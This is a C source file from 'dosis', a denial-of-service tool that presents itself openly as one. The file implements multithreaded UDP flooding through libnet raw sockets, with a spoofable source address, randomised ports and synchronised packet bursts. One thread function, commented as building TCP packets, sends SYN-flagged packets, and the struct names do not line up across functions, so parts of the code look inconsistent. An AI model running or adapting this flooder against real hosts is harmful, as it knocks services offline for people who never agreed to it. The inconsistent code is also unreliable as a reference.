/*****************************************************************************
 * udp.c
 *
 * UDP packet generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosis.h"

typedef struct _tag_UDP_CFG {
  /* options */
  INET_ADDR          shost;
  INET_ADDR          dhost;
  int                flags;

  /* parameters */
  unsigned           npackets;
  char               req;
  unsigned           req_size;
  double             hitratio;

  /* other things */
  pthreadex_timer_t  timer;
  LN_CONTEXT        *lnc;
} UDP_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define udp_header(x)  ((struct udphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

static int udp__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || ip_protocol(msg) != 17
  || size < sizeof(struct udphdr) + (ip_header(msg)->ihl << 2))
    return 0;

  /* check msg */
DBG("[%s]   VEREDICT: %d (%x, %d) [%x, %d]",
    tw->methods->name,
    ip_header(msg)->saddr == tu->dhost.addr.in.addr
    && ntohs(udp_header(msg)->source) == tu->dhost.port,
    ip_header(msg)->saddr, ntohs(udp_header(msg)->source),
    tu->dhost.addr.in.addr, tu->dhost.port);
  return ip_header(msg)->saddr == tu->dhost.addr.in.addr
      && ntohs(udp_header(msg)->source) == tu->dhost.port
         ? -255 : 0;
}

static void udp__thread(THREAD_WORK *tw)
{
  UDP_CFG *tu = (UDP_CFG *) tw->data;
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int i;

  DBG("[%02u] Started sender thread", tw->id);

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tu->hitratio > 0)
      if(pthreadex_timer_wait(&(tu->timer)) < 0)
        ERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /* build TCP packet with payload (if requested) */
    DBG("[%02u] Sending %d packet(s)...", tw->id, tu->npackets);
    for(i = 0; i < tu->npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(tu->lnc,
                     &tu->shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &tu->dhost.addr.in.inaddr, tu->dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }
}

void attack_udpflood__thread_cleanup(UDPFLOOD_TWORK *uw)
{
  thread_timer_stats_libnet(uw->ln, &uw->w->stats);

  if(uw->ln)
    libnet_destroy(uw->ln);
}

void attack_udpflood__thread(THREAD_WORK *w)
{
  UDPFLOOD_TWORK uw;
  int r;
  u_int32_t sport, dport, seq;
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_ptag_t udp_p, ipv4_p;
  unsigned char *pl;
  unsigned int plsz;
  u_int64_t cpacket;

  /* initialize thread work data */
  memset(&uw, 0, sizeof(UDPFLOOD_TWORK));
  uw.w = w;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_udpflood__thread_cleanup, &uw);

  /* wait 4 start */
  pthreadex_barrier_wait(w->start);

  /* initialize libnet */
  DBG1("[%02u] Initializing libnet.", w->id);
  if((uw.ln = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL)
    FAT("[%02u] Cannot initialize libnet: %s", w->id, errbuf);
  if(libnet_seed_prand(uw.ln) < 0)
    FAT("[%02u] Faild to initialize libnet pseudorandom number generator.", w->id);

  /* set how many packets will be sent by this thread */
  uw.npackets = opts.packets / ((u_int64_t) opts.c);
  if(w->id == 0)
    uw.npackets += opts.packets - (uw.npackets * ((u_int64_t) opts.c));

  /* three! two! one! zero! go go go gooooo! */
  udp_p = LIBNET_PTAG_INITIALIZER;
  ipv4_p = LIBNET_PTAG_INITIALIZER;
  seq = libnet_get_prand(LIBNET_PRu32);
  sport = opts.sport;
  dport = opts.dport;
  pl    = opts.payload;
  plsz  = opts.payload_size;

  while(!opts.finalize)
  {
    /* wait for work */
    if(!w->id)
    {
      pthreadex_flag_wait(&attack_flag);
      DBG1("[%02u] Burst...", w->id);
    }

    /* sync threads */
    pthreadex_barrier_wait(&burst_barrier);

    /* launch packets */
    DBG2("[%02u]   Sending %lld packets.", w->id, uw.npackets);
    for(cpacket = 0; cpacket < uw.npackets; cpacket++)
    {
      if(opts.rsport)
        sport = libnet_get_prand(LIBNET_PRu16);
      if(opts.rdport)
        dport = libnet_get_prand(LIBNET_PRu16);
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;

      udp_p = libnet_build_udp(
                  sport,               /* src port        */
                  dport,               /* dst port        */
                  LIBNET_UDP_H + plsz, /* pkt_len         */
                  0,                   /* checksum        */
                  pl,                  /* payload         */
                  plsz,                /* payload_size    */
                  uw.ln,               /* libnet context  */
                  udp_p);              /* protocol tag    */
      if(udp_p == -1)
        FAT("Can't build UDP header: %s", libnet_geterror(uw.ln));

      ipv4_p = libnet_build_ipv4(
                   LIBNET_IPV4_H +      /* pkt_len        */
                   LIBNET_UDP_H +
                   plsz,
                   0x00,                /* TOS            */
                   0x0000,              /* ID             */
                   0x0000,              /* frag           */
                   0xf0,                /* ttl            */
                   IPPROTO_UDP,         /* proto          */
                   0,                   /* checksum       */
                   opts.shost.s_addr,   /* shost          */
                   opts.dhost.s_addr,   /* dhost          */
                   NULL,                /* *payload       */
                   0,                   /* payload size   */
                   uw.ln,               /* libnet context */
                   ipv4_p);             /* protocol tag   */
      if(ipv4_p == -1)
        FAT("Can't build IP header: %s", libnet_geterror(uw.ln));

      if(libnet_write(uw.ln) == -1)
        FAT("[%02u] Error sending packet: %s", w->id, libnet_geterror(uw.ln));
    }
  }

  pthread_cleanup_pop(1);
}

int attack_udpflood__go2work(void)
{
  /* flag that will keep attack threads waiting for work */
  return pthreadex_flag_up(&attack_flag);
}

void attack_udpflood(TTIMER_STATS *ttstats)
{
  /* flag that will keep attack threads waiting for work */
  pthreadex_flag_init(&attack_flag, 0);

  /* barrier to synchronize threads in bursts */
  pthreadex_barrier_init(&burst_barrier, opts.c);

  /* launch attack */
  thread_timer(attack_udpflood__go2work,
               attack_udpflood__thread,
               ttstats);
}

